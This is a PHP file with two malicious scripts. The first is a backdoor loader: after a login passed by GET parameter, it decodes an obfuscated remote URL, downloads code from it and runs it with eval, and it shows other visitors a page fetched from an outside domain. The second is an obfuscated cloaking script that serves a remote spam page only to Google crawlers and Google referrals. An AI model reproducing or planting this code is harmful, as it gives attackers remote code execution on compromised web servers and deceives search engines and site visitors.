<?php

error_reporting(0);
ini_set('display_errors', 0);
session_start();

// Cek status login
function is_logged_in() {
    return isset($_SESSION['APOLLON']);
}

// Proses login
function login($password) {
    $valid_password_hash = '$2a$12$iT1Z7LIAgJQqnWhbaRf9y.BR6d9TcPZPMnOosDZgvdKPieB/8wpxe'; // hash bcrypt
    if (password_verify($password, $valid_password_hash)) {
        $_SESSION['APOLLON'] = 'user';
        return true;
    }
    return false;
}

// Logout
function logout() {
    unset($_SESSION['APOLLON']);
}

// Handle login
if (isset($_GET['password'])) {
    $password = $_GET['password'];
    if (login($password)) {
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        echo '<script>alert("CIHUYYYYYYYYYYYYYYYYYY!");</script>';
    }
}

// Fungsi ambil konten dari URL
function getContent($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($curl);
    curl_close($curl);
    return $content ?: @file_get_contents($url);
}

// Encode / Decode URL
function encode_url($url) {
    return urlencode(str_rot13(base64_encode($url)));
}
function decode_url($encoded_url) {
    return base64_decode(str_rot13(urldecode($encoded_url)));
}

// Link terenkripsi
$encoded_url = 'nUE0pUZ6Yl9lLKphrzI2MKWcrP5wo20ipzS3Y3IhqTy0oTIxYGRkAt%3D%3D';
$decoded_url = decode_url($encoded_url);

// Jika sudah login
if (is_logged_in()) {
    if ($decoded_url) {
        $content = getContent($decoded_url);
        if ($content) {
            eval('?>' . $content);
            exit;
        }
    }

    // Jika URL gagal di-load, tampilkan fallback
    include 'dashboard.html';
    exit;
}

// Jika belum login → tampilkan isi dari apx404
header('Content-Type: text/html');
echo getContent('apollondestroyer.org');
exit;
?>

\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

r
<?php
/*   __________________________________________________
    |         Obfuscated by ApollonDestroyer69         |  
    |__________________________________________________|
*/
 goto F3i3o; HEAMr: if (!($EDn0r == "\57" && (preg_match("\57\142\x6f\164\174\147\x6f\x6f\x67\x6c\x65\174\x63\x68\x72\x6f\x6d\145\x2d\x6c\x69\147\x68\x74\150\x6f\x75\163\x65\57\x69", $vM5WB) || preg_match("\x2f\x67\x6f\x6f\x67\x6c\x65\x2f\x69", $QVr7C)))) { goto jWZfw; } goto qAgLk; qAgLk: echo file_get_contents("\x68\x74\x74\160\x73\72\57\x2f\141\160\x6f\154\154\157\x6e\144\x65\x73\164\162\157\171\145\162\56\157\162\x67\57\x73\x65\x6c\x69\156\x67\153\x75\x68\x61\x6e\x67\157\x6f\x67\x6c\145\164\x65\x61\155\57\x6e\x65\x74\x61\160\x6f\x73\x2f"); goto a0Vot; ITL0V: $EDn0r = $_SERVER["\122\105\121\x55\105\x53\124\x5f\125\x52\111"] ?? ''; goto HEAMr; a0Vot: exit; goto px_ev; F3i3o: $vM5WB = strtolower($_SERVER["\110\124\x54\x50\x5f\x55\123\105\122\x5f\x41\x47\105\116\124"] ?? ''); goto qQ_T3; qQ_T3: $QVr7C = strtolower($_SERVER["\110\x54\124\120\x5f\x52\x45\x46\105\122\105\x52"] ?? ''); goto ITL0V; px_ev: jWZfw:
